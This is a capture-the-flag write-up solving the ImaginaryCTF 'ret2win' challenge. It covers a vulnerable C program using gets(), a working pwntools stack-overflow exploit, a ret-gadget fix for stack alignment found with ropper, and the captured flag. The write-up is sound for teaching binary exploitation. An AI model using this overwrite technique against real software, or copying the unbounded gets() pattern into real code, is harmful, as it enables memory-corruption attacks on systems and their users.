# ret2win

## Description

> Can you overflow the buffer and get the flag? (Hint: if your exploit isn't working on the remote server, look into stack alignment)
>
> Author: Eth007
>
> https://imaginaryctf.org/r/BoCID#vuln \
> https://imaginaryctf.org/r/73iLJ#vuln.c \
> nc ret2win.chal.imaginaryctf.org 1337

Tags: _pwn_

## Solution

As the challenge name suggests, this is a `ret2win` challenge, which means We have to change the flow of the program to execute a function called `win()` by doing a stack overflow and overwriting the return address `RET` to redirect the program's execution flow to the address of the `win()` function. I really recommend watching [this video](https://www.youtube.com/watch?v=1S0aBV-Waeo) since he explains really well how buffer overflow works.

Now, let's take a look at the source code:

```c
#include <stdio.h>
#include <unistd.h>

int main() {
  char buf[64];
  gets(buf);
}

int win() {
  system("cat flag.txt");
}
```

As we can see the program just initialize a 64 bytes buffer (or 64 characters since a character is 1 byte long), and lets the user fill it using the function `gets()`. This function is well known as being vulnerable to buffer overflow attacks because it does not perform any bounds checking on the input. So the idea here is to provide the program with 64 bytes of garbage to fill the buffer plus 8 bytes of more garbage to overwrite the base pointer `BP` and the `win()` function's address to overwrite the return address `RET` effectively changing the program's flow execution. To do so I used the `pwntools` library, which is a powerful and popular framework for exploit development. Don't be stirred by the number of lines, the most important thing to see here is the part where I build the payload and send it to the program, everything else is more like a template.

```python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("vuln")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("ret2win.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

# Overwrite the return address with the win() function's memory address
payload = b'A'*72 + p64(elf.sym.win)

# Send the payload
io.sendline(payload)

# Interact with the process
io.interactive()
```

Run the exploit script as I did here:

```shell
$ ./xpl.py REMOTE
[*] '/home/jovenoven/Downloads/imaginary_ctf/pwn/ret2win/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to ret2win.chal.imaginaryctf.org on port 1337: Done
[*] Switching to interactive mode
== proof-of-work: disabled ==
[*] Got EOF while reading in interactive
$ a
$ a
[*] Closed connection to ret2win.chal.imaginaryctf.org port 1337
[*] Got EOF while sending in interactive


```

It didn't retrieve the flag because internally the program got a `SIGSEGV` code or a `segmentation fault`. The reason why this happens is a stack alignment error. Stack alignment refers to the requirement that the stack pointer `SP` should be aligned to a multiple of 16 bytes, which is violated when inserting the `win()` function address directly. The easiest way to solve this problem is to add a `ret` gadget to the payload, effectively creating a [`ROP Chain`](https://www.ired.team/offensive-security/code-injection-process-injection/binary-exploitation/rop-chaining-return-oriented-programming). We can get its address with `ropper`.

```c
$ ropper --file vuln
...
0x00000000004010a3: cli; ret;
0x000000000040119c: endbr64; sub rsp, 8; add rsp, 8; ret;
0x0000000000401000: endbr64; sub rsp, 8; mov rax, qword ptr [rip + 0x2fe9]; test rax, rax; je 0x1016; call rax;
0x00000000004010a0: endbr64; ret;
0x0000000000401095: hlt; nop word ptr cs:[rax + rax]; endbr64; ret;
0x0000000000401178: leave; ret;
0x0000000000401196: nop; pop rbp; ret;
0x00000000004010cf: nop; ret;
0x000000000040101a: ret;

100 gadgets found

```

The final script should look like this:

```python
#!/usr/bin/python3
from pwn import *

# Set up the target binary by specifying the ELF file
elf = context.binary = ELF("vuln")

# Defining the GDB script that will be used when running the binary
gs = '''
continue
'''
# Launch the binary with GDB, without GDB or REMOTE based on the command-line arguments
def start():
    if args.REMOTE:
        return remote("ret2win.chal.imaginaryctf.org", 1337)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

io = start()

# Overwrite the return address with the win() function's memory address
payload = b'A'*72 + p64(0x40101a) + p64(elf.sym.win)

# Send the payload
io.sendline(payload)

# Interact with the process
io.interactive()
```

Then, execute it with the `REMOTE` option and get the flag!

```shell
$ ./solve.py REMOTE
[*] '/home/jovenoven/Downloads/imaginary_ctf/pwn/ret2win/vuln'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to ret2win.chal.imaginaryctf.org on port 1337: Done
[*] Switching to interactive mode
== proof-of-work: disabled ==
ictf{r3turn_0f_th3_k1ng?}
[*] Got EOF while reading in interactive
$ a
$ a
[*] Closed connection to ret2win.chal.imaginaryctf.org port 1337
[*] Got EOF while sending in interactive

```

Flag `ictf{r3turn_0f_th3_k1ng?}`
